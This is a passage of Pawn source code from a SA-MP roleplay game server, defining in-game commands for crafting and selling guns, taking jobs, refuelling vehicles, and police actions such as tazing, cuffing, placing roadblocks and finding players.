			SendClientMessage(playerid,COLOR_LIGHTBLUE,"You Are Now Known To Detectives!");
			pNoFind[playerid] = 0;
			return 1;
		}
		return 1;
	}
	if(strcmp(cmd,"/creategun",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
        	    if (PlayerInfo[playerid][pJob] != 9)
	  		    {
			    	SendClientMessage(playerid,COLOR_LIGHTBLUE,"You are not a Arms Dealer.");
			    	return 1;
			    }
	        	tmp = strtok(cmdtext, idx);
	        	if(!strlen(tmp))
	        	{
 				SendClientMessage(playerid, CRISTIAN, "________________________________________________");
				SendClientMessage(playerid, COLOR_WHITE, "*** Create Guns ***");
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /creategun [WeaponName]");
				SendClientMessage(playerid, COLOR_CRS3, "Weapons: Combat ShotGun(200), Deagle(300), Shotgun(400), AK47(500), M4(550), Rifle(600)");
	        	return 1;
	        	}

     			if(strcmp(tmp,"Combat",true) == 0) { if(PlayerInfo[playerid][pMats] >= 200) { weapon[playerid] = 27; Mat[playerid] = 200; ammo[playerid] = 100; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
				else if(strcmp(tmp,"deagle",true) == 0) { if(PlayerInfo[playerid][pMats] >= 300) { weapon[playerid] = 24; Mat[playerid] = 300; ammo[playerid] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
				else if(strcmp(tmp,"shotgun",true) == 0) {	if(PlayerInfo[playerid][pMats] >= 400) { weapon[playerid] = 25; Mat[playerid] = 400; ammo[playerid] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
				else if(strcmp(tmp,"ak47",true) == 0) { if(PlayerInfo[playerid][pMats] >= 500) { weapon[playerid] = 30; Mat[playerid] = 500; ammo[playerid] = 250; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
				else if(strcmp(tmp,"m4",true) == 0) { if(PlayerInfo[playerid][pMats] >= 550) { weapon[playerid] = 31; Mat[playerid] = 550; ammo[playerid] = 250; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
				else if(strcmp(tmp,"rifle",true) == 0) { if(PlayerInfo[playerid][pMats] >= 600) { weapon[playerid] = 33; Mat[playerid] = 600; ammo[playerid] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
					else
					{
 				SendClientMessage(playerid, COLOR_RED, "{57e547}Shoma Faghat MitavaniD GuN Haye ZiR Ra BesaziD");
				SendClientMessage(playerid, COL_SYN, "Weapons: Combat ShotGun, Deagle, Shotgun, AK47, M4, Rifle");
				return 1;
				}
				 tmp = strtok(cmdtext, idx);
				 GivePlayerTofang(playerid,weapon[playerid],50);
                 PlayerInfo[playerid][pMats] -=Mat[playerid];
                 format(string, sizeof(string), "%s Created Gun From Materials.",PlayerName(playerid));
                 ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return 1;
		}
		return 1;
	}

    if(strcmp(cmd,"/sellgun",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pJob] != 9)
            {
                SendClientMessage(playerid,COLOR_LIGHTBLUE,"You are not a Arms Dealer.");
                return 1;
            }
            if(PlayerInfo[playerid][pJailTime] >= 1)
            {
            SCM(playerid,COLOR_YELLOW, "You can't sell gun when you are in jail."); return 1;
            }
            new x_weapon[256];
            new money;
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, CRISTIAN, "________________________________________________");
                SendClientMessage(playerid, COLOR_WHITE, "*** Sell Guns ***");
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellgun [playerid/PartOfName] [WeaponName] [price]");
                SendClientMessage(playerid, COLOR_CRS3, "Weapons: Combat(1000), Deagle(300), Shotgun(400), tec-9(700), M4(550), Rifle(600)");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if (IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                if(giveplayerid == playerid)
                {
                SCM(playerid,COLOR_LIGHTBLUE,"You can not sell a gun to yourself.");
                return 1;
                }
                    x_weapon = strtok(cmdtext, idx);
                    if(!strlen(x_weapon))
                    {
                        SendClientMessage(playerid, CRISTIAN, "________________________________________________");
                        SendClientMessage(playerid, COLOR_WHITE, "*** Sell Guns ***");
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellgun [playerid/PartOfName] [WeaponName] [price]");
                        SendClientMessage(playerid, COLOR_CRS3, "Weapons: Combat(1000), Deagle(300), Shotgun(400), tec-9(700), M4(550), Rifle(600)");
                        return 1;
                    }
                    if(PlayerInfo[giveplayerid][pGunLic] == 0) { SCM(playerid,COLOR_WHITE, "That player dont have weapon license!"); return 1; }
                    if(PlayerInfo[giveplayerid][pJailTime] >= 1)
                    {
                    SCM(playerid,COLOR_YELLOW, "You can't sell gun to jailed pirsons."); return 1;
                    }
                }
                if(strcmp(x_weapon,"Combat",true) == 0) { if(PlayerInfo[playerid][pMats] >= 1000) { weapon[giveplayerid] = 27; Mat[giveplayerid] = 1000; ammo[giveplayerid] = 100; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
                else if(strcmp(x_weapon,"deagle",true) == 0) { if(PlayerInfo[playerid][pMats] >= 300) { weapon[giveplayerid] = 24; Mat[giveplayerid] = 300; ammo[giveplayerid] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
                else if(strcmp(x_weapon,"shotgun",true) == 0) { if(PlayerInfo[playerid][pMats] >= 400) { weapon[giveplayerid] = 25; Mat[giveplayerid] = 400; ammo[giveplayerid] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
                else if(strcmp(x_weapon,"tec-9",true) == 0) { if(PlayerInfo[playerid][pMats] >= 700) { weapon[giveplayerid] = 32; Mat[giveplayerid] = 700; ammo[giveplayerid] = 250; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
                else if(strcmp(x_weapon,"m4",true) == 0) { if(PlayerInfo[playerid][pMats] >= 550) { weapon[giveplayerid] = 31; Mat[giveplayerid] = 550; ammo[giveplayerid] = 250; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
                else if(strcmp(x_weapon,"rifle",true) == 0) { if(PlayerInfo[playerid][pMats] >= 600) { weapon[giveplayerid] = 33; Mat[giveplayerid] = 600; ammo[giveplayerid] = 50; } else { SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!"); return 1; } }
                else { SendClientMessage(playerid,COLOR_GREY,"Invalid Weapon name!"); return 1; }
                tmp = strtok(cmdtext, idx);
                money = strval(tmp);
                new money2 = GetPlayerPool(giveplayerid);
                if(money > 20000 || money < 1) { SCM(playerid,COLOR_WHITE,"Invalid Price,minimum allowed is $1 and maximum $20,000."); return 1; }
                if (ProxDetectorS(5.0, playerid, giveplayerid))
                {
                if(money2 < money)
                {
                format(string, sizeof(string), "That player just have $%s", FormatNumber(money2));
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                return 1;
                }
                    if(Tofang[giveplayerid] == playerid) { SCM(playerid,COLOR_WHITE, "You already offerd to this player!"); return 1; }
                    GunPricee[giveplayerid] = money;
                    Tofang[giveplayerid] = playerid;
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    format(string, sizeof(string), "You have offered %s, a %s with %d ammo, for $%s money.", giveplayer,x_weapon, ammo[giveplayerid], FormatNumber(GunPricee[giveplayerid]));
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "%s has offered you a %s with %d ammo for $%s.(Use: /accept gun %d to accept this)", sendername,x_weapon, ammo[giveplayerid], FormatNumber(GunPricee[giveplayerid]),playerid);
                    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GRAD1, "That player isnt near you.");
                    return 1;
                }
            }
            else
            {
                format(string, sizeof(string), "that player is offline.");
                SendClientMessage(playerid, COLOR_GRAD1, string);
            }
        }
        return 1;
    }
        //---------------
    if(strcmp(cmd, "/getjob", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] == 0)
            {
                if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,359.5408,206.7693,1008.3828))
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Detective.");
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 1;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,362.0605,173.7425,1008.3828))
                {
                if (PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3) { SCM(playerid, COLOR_RED,"You can't Join a Lawyer but you are a Cop."); return 1; }
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Lawyer.");
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 2;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,323.507873,1117.880981,1083.882812))
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Drugs dealer.");
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 4;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,2515.572265,-1473.751220,24.009740))
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Car jacker.");
                    SCM(playerid,COLOR_LIGHTBLUE,"Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 5;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1658.4885,2199.7075,10.8203))
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Car mechanic.");
                    SCM(playerid,COLOR_LIGHTBLUE,"Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 7;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1765.061889,-2031.958862,14.048107) || PlayerToPoint(3.0, playerid,1909.430297,2351.376453,10.979915))
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Bus driver.");
                    SCM(playerid,COLOR_LIGHTBLUE,"Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 14;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,-77.235397,-1136.455932,1.078125))
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Trucker.");
                    SCM(playerid,COLOR_LIGHTBLUE,"Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 16;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,-382.6660,-1426.5121,26.2410) || PlayerToPoint(3.0, playerid,-1061.110107,-1195.576660,129.728820))
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Farmer.");
                    SCM(playerid,COLOR_LIGHTBLUE,"Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 18;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,2440.481201,-1970.118164,13.546875))
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now a Arms Dealer.");
                    SCM(playerid,COLOR_LIGHTBLUE,"Use /jobhelp to see job help.");
                    PlayerInfo[playerid][pJob] = 9;
                }
                else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,2077.161376,-2006.656250,13.546875))
                {
                SCM(playerid,COLOR_LIGHTBLUE,"You are now a Garbage man.");
                SCM(playerid,COLOR_LIGHTBLUE,"Use /jobhelp to see job help.");
                PlayerInfo[playerid][pJob] = 20;
                }
                 else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1612.7501,-1839.9008,13.5223))
                {
                SCM(playerid,COLOR_LIGHTBLUE,"Shoma Ranande Sherkat Shodid.");
                SCM(playerid,COLOR_LIGHTBLUE,"Use /jobhelp to see job help.");
                PlayerInfo[playerid][pJob] = 21;
                }
                else
                {
                    return 1;
                }
                SaveKonVal(playerid, "pJob", PINFO[playerid][pJob]);
            }
            else
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You already have a job quit from your job first(use /quitjob)");
            }
        }//not connected
        return 1;
    }
    if(strcmp(cmd, "/fill", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if(!IsPlayerInAnyVehicle(playerid))
        {
        SCM(playerid,COLOR_ALI,"You are not in any vehicle.");
        return 1;
        }
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid,COLOR_ALI,"You are not driver of this vehicle.");
            if(IsAtGasStation(playerid))
            {
                new carid = GetPlayerVehicleID(playerid);
                if(EngineSTATE[carid] == 1)
                {
                SCM(playerid,COLOR_LIGHTBLUE,"First Stop the engine of your vehicle.");
                return 1;
                }
                    if(Benzin[idcar] <= 99)
                    {
                        GameTextForPlayer(playerid,"~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~Re-Fueling Vehicle, please wait",2000,3);
                        SetTimerEx("Fillup",RefuelWait,0,"i",playerid);
                        Refueling[playerid] = 1;
                        TogglePlayerControllable(playerid, 0);
                    }
                    else {
                    GameTextForPlayer(playerid,"~r~~n~~n~~n~~n~~n~~n~~n~~n~~n~Gas can is full",2000,3);
                    return 1; }
            }
            else {
            SCM(playerid,COLOR_GREY,"** You're not at a Gas Station!");
            return 1; }
        }
        return 1;
    }
    if(strcmp(cmd, "/fillcar", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pCanistra] >= 1)
            {
                if(PlayerInfo[playerid][pCanistra] >= 1)
                {
                    if(Benzin[gLastCar[playerid]] < 81)
                    {
                        SCM(playerid, COLOR_WHITE, "** You filled your car with 20 percent Fuel from your Gas Can.");
                        Benzin[gLastCar[playerid]] += 20;
                        PlayerInfo[playerid][pCanistra] = 0; SaveKonVal(playerid, "pCanistra", 0);
                    }
                    else
                    {
                        SCM(playerid, COLOR_GREY, "** Your Car still got enough Fuel to drive with !");
                        return 1;
                    }
                }
                else
                {
                    SCM(playerid, COLOR_CRS3, "** You haven't gas can.");
                    return 1;
                }
            }
            else
            {
                SCM(playerid, COLOR_GREY, "** You have no Fuel left in your Gas Can !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/tazer", true) ==0 || strcmp(cmd, "/ta", true) ==0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
				if(OnDuty[playerid] != 1) return SendClientMessage(playerid, COLOR_BLUE, "You are not on-duty.");
                if(IsPlayerInAnyVehicle(playerid))
                {
                    SendClientMessage(playerid, COLOR_GREY, "   Cannot use this while being in the Car!");
                    return 1;
                }
                new suspect = GetClosestPlayer(playerid);
                if(IsPlayerConnected(suspect))
                {
                    if(PlayerCuffed[suspect] > 0)
                    {
                        SendClientMessage(playerid, COLOR_GREY, "   Player already Cuffed!");
                        return 1;
                    }
                    if(GetDistanceBetweenPlayers(playerid,suspect) < 5)
                    {
                        if(gTeam[suspect] == TEAM_COP)
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   Cannot Tazer Cops / FBI!");
                            return 1;
                        }
                        if(IsPlayerInAnyVehicle(suspect))
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   Suspect is in a Car, get him out first!");
                            return 1;
                        }
                        GetPlayerName(suspect, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        new randt = random(4)+1;
                        if(randt == 1)
                        {
                            format(string, sizeof(string), "%s shoots with his Tazer at %s, but missed.", sendername ,giveplayer);
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        }
                        else
                        {
                            format(string, sizeof(string), "* You were Tazed by %s for 20 seconds.", sendername);
                            SendClientMessage(suspect, COLOR_WHITE, string);
                            format(string, sizeof(string), "* You Tazed %s for 20 seconds.", giveplayer);
                            SendClientMessage(playerid, COLOR_WHITE, string);
                            format(string, sizeof(string), "%s shoots with his Tazer at %s and tazed him.", sendername ,giveplayer);
                            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                            GameTextForPlayer(suspect, "~r~Tazed", 2500, 3);
                            TogglePlayerControllable(suspect, 0);
                            LoopingAnim(suspect, "CRACK","crckdeth2", 4.0,1,0,0,0,0);
                            PlayerCuffed[suspect] = 1;
                            PlayerCuffedTime[suspect] = 20;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "   No-one near you!");
                        return 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a Cop / FBI!");
            }
        }//not connected
        return 1;
    }
    //-------------------------------------------------------------------------------------

        if(strcmp(cmd, "/covername", true) == 0) {
    if(PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pLeader] != 8 && PlayerInfo[playerid][pMember] != 2 && PlayerInfo[playerid][pMember] != 8)
    {
    SCM(playerid,COLOR_visit,"you are not a hitmen or fbi.");
    return 1;
    }
    if(PlayerInfo[playerid][pLeader] == 2 && OnDuty[playerid] != 1 || PlayerInfo[playerid][pMember] == 2 && OnDuty[playerid] != 1) {
    SCM(playerid,COLOR_visit,"you are not on-duty.");
    return 1;
    }
            new cover[1024];
            format(cover,sizeof(cover),"Skins \t\nNameColor \t\nOFF");
            ShowPlayerDialog(playerid,998860,DIALOG_STYLE_LIST,"CoverName:",cover,"Select","Cancel");
            return 1;
    }
    if(strcmp(cmd, "/showwanteds", true) == 0)
    {
		if(gTeam[playerid] != TEAM_COP || !IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "You are not a Cop / FBI / National Guard !");
		new string3[512],string2[512];
		for(new i; i < MAX_PLAYERS; i++)
        {
			format(string3,sizeof(string3),"{FFFFFF}%s(%d) - {57e547}[%d]\n",PlayerName(i),i,GetPlayerWantedLevel(i));
			strcat(string2,string3, sizeof(string2));
		}
		ShowPlayerDialog(playerid,DIALOG_SHOWWANTED,DIALOG_STYLE_MSGBOX, "{57e547}Online Wanteds:",string2, "{57e547}Show","{FFFFFF}Close");
	}
	if(strcmp(cmd, "/crb", true) == 0 || strcmp(cmd, "/rb", true) == 0)
	{
	     if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /crb [1/3]");
                SendClientMessage(playerid,COLOR_GRAD2, "| 1: Roadblock Kochak");
   				SendClientMessage(playerid,COLOR_GRAD2, "| 2: Roadblock Motevaset");
    			SendClientMessage(playerid,COLOR_GRAD2, "| 3: Roadblock Bozorg");
                return 1;
            }
            new Float:slx, Float:sly, Float:slz;
          //  if(playa >= 3 || playa <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "in Roadblock Vojod Nadarad /crb <1/3>");
             new string[256];
            if(gTeam[playerid] == TEAM_COP){
        if(strcmp(tmp, "1", true) == 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
  			new Float:plocx,Float:plocy,Float:plocz,Float:ploca;
    		GetPlayerPos(playerid, plocx, plocy, plocz);
     		GetPlayerFacingAngle(playerid,ploca);
      		CreateRoadblock(1459,plocx,plocy,plocz,ploca);
      		format(string,sizeof(string),"[Warn]: Hamkar/Admin %s yek Roadblock Gozasht, over.",PlayerName(playerid));
          	SendRadioMessage(1,COLOR_BLUE,string);
          	GameTextForPlayer(playerid,"~w~Roadblock ~b~Gozashtid!",3000,1);
           	return 1;
		}
		else if(strcmp(tmp, "2", true) == 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
 			new Float:plocx,Float:plocy,Float:plocz,Float:ploca;
   			GetPlayerPos(playerid, plocx, plocy, plocz);
     		GetPlayerFacingAngle(playerid,ploca);
      		CreateRoadblock(978,plocx,plocy,plocz+0.6,ploca);
   			format(string,sizeof(string),"[Warn]: Hamkar/Admin %s yek Roadblock Gozasht, over.",PlayerName(playerid));
          	SendRadioMessage(1,COLOR_BLUE,string);
          	GameTextForPlayer(playerid,"~w~Roadblock ~b~Gozashtid!",3000,1);
           	return 1;
		}
 		else if(strcmp(tmp, "3", true) == 0)
  		{
  			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
   			new Float:plocx,Float:plocy,Float:plocz,Float:ploca;
     		GetPlayerPos(playerid, plocx, plocy, plocz);
      		GetPlayerFacingAngle(playerid,ploca);
       		CreateRoadblock(981,plocx,plocy,plocz+0.9,ploca+180);
         	format(string,sizeof(string),"[Warn]: Hamkar/Admin %s yek Roadblock Gozasht, over.",PlayerName(playerid));
          	SendRadioMessage(1,COLOR_BLUE,string);
           	GameTextForPlayer(playerid,"~w~Roadblock ~g~Gozashtid!",3000,1);
            SetPlayerPos(playerid, plocx, plocy+1.3, plocz);
            return 1;
		}
		else {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /crb [1/3]");
                SendClientMessage(playerid,COLOR_GRAD2, "| 1: Roadblock Kochak");
   				SendClientMessage(playerid,COLOR_GRAD2, "| 2: Roadblock Motevaset");
    			SendClientMessage(playerid,COLOR_GRAD2, "| 3: Roadblock Bozorg");
                return 1;
            }
        	
          	}
          	}
          	return 1;
 			//ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE)
	}
	if(strcmp(cmd, "/dallrb", true) == 0 || strcmp(cmd, "/drba", true) == 0)
	{
	     if(IsPlayerConnected(playerid))
        {
            new string[256];
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid || PINFO[playerid][pAdmin] >= 1)){
       DeleteAllRoadblocks(playerid);
        	format(string,sizeof(string),"[Warn]: Hamkar/Admin: %s Hame ye Roadblock Remove Kard, over.",PlayerName(playerid));
         	SendRadioMessage(1,COLOR_BLUE,string);
          	GameTextForPlayer(playerid,"~b~All ~w~Roadblocks ~r~Removed!",3000,1);
          	}
          	}
          	return 1;
 			//ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE)
	}
    if(strcmp(cmd, "/cuff", true) == 0 || strcmp(cmd, "/cu", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp)) {
                    SendClientMessage(playerid, COLOR_WHITE, "USAGE: /cuff [Playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        if(gTeam[giveplayerid] == TEAM_COP || IsACop(giveplayerid))
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   You can't Cuff Cops !");
                            return 1;
                        }
                        if(PlayerCuffed[giveplayerid] > 0)
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   Player already Cuffed !");
                            return 1;
                        }
                        if (ProxDetectorS(8.0, playerid, giveplayerid))
                        {
                            new car = GetPlayerVehicleID(playerid);
                            if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Cuff yourself!"); return 1; }
                            if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(giveplayerid, car))
                            {
                                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, sizeof(string), "* You were Cuffed by %s, till uncuff.", sendername);
                                SendClientMessage(giveplayerid, COLOR_WHITE, string);
                                format(string, sizeof(string), "* You Cuffed %s, till uncuff.", giveplayer);
                                SendClientMessage(playerid, COLOR_WHITE, string);
                                format(string, sizeof(string), "%s Hand Cuffs %s, so he wont go anywhere.", sendername ,giveplayer);
                                ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                                GameTextForPlayer(giveplayerid, "~r~Cuffed", 2500, 3);
                                TogglePlayerControllable(giveplayerid, 0);
                                PlayerCuffed[giveplayerid] = 1;
                                PlayerCuffedTime[giveplayerid] = 99999999999999;
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "   Player not in your Car, or your not the Driver !");
                                return 1;
                            }
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   That player is not near you !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a Cop / FBI / National Guard !");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/uncuff", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp)) {
                    SendClientMessage(playerid, COLOR_WHITE, "USAGE: /uncuff [Playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        if (ProxDetectorS(8.0, playerid, giveplayerid))
                        {
                            if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Uncuff yourself!"); return 1; }
                            if(PlayerCuffed[giveplayerid])
                            {
                                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, sizeof(string), "* You were Uncuffed by %s.", sendername);
                                SendClientMessage(giveplayerid, COLOR_WHITE, string);
                                format(string, sizeof(string), "* You Uncuffed %s.", giveplayer);
                                SendClientMessage(playerid, COLOR_WHITE, string);
                                GameTextForPlayer(giveplayerid, "~g~Uncuffed", 2500, 3);
                                TogglePlayerControllable(giveplayerid, 1);
                                PlayerCuffed[giveplayerid] = 0;
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_GREY, "   That player isn't Tied up !");
                                return 1;
                            }
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   That player is not near you !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a Cop / FBI / National Guard !");
            }
        }//not connected
        return 1;
        //-------------------------------
    }
    if(strcmp(cmd, "/find", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] != 1)
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are not a Detective.");
                return 1;
            }
            if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
            if(UsedFind[playerid] != 0 && PlayerInfo[playerid][pDetSkill] < 401)
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You've already searched for someone, wait 2 minutes.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /find [playerid/PartOfName]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Find yourself!"); return 1; }
                    if(pNoFind[giveplayerid] == 1) { SendClientMessage(playerid, COLOR_GREY, "You cannot Find Admins!"); return 1; }
                    new points;
                    new level = PlayerInfo[playerid][pDetSkill];
                    if(level >= 0 && level <= 50)
                    { points = 30; }
                    else if(level >= 51 && level <= 100)
                    { points = 60; }
                    else if(level >= 101 && level <= 200)
                    { points = 100; }
                    else if(level >= 201 && level <= 399)
                    { points = 150; }

                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    FindAccepted[playerid] = giveplayerid;
                    new zonename[30];
                    GetPlayerZoneName(giveplayerid, zonename, 30)
                    format(string, 256, "Checkpoint added - %s, use /cancel find to cancel your checkpoint.",zonename);
                    SendClientMessage(playerid, COLOR_Good, string);
                    FindTime[playerid] = 1;
                    FindTimePoints[playerid] = points;
                    if(PINFO[playerid][pDetSkill] < 401){PlayerInfo[playerid][pDetSkill] ++; SaveKonVal(playerid, "pDetSkill", PINFO[playerid][pDetSkill]);}
                    UsedFind[playerid] = 1;
                    CP[playerid] = 0;
                    if(PlayerInfo[playerid][pDetSkill] == 50)
                    { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill is now Level 2, soon you are able to find Faction Members."); }
                    else if(PlayerInfo[playerid][pDetSkill] == 100)
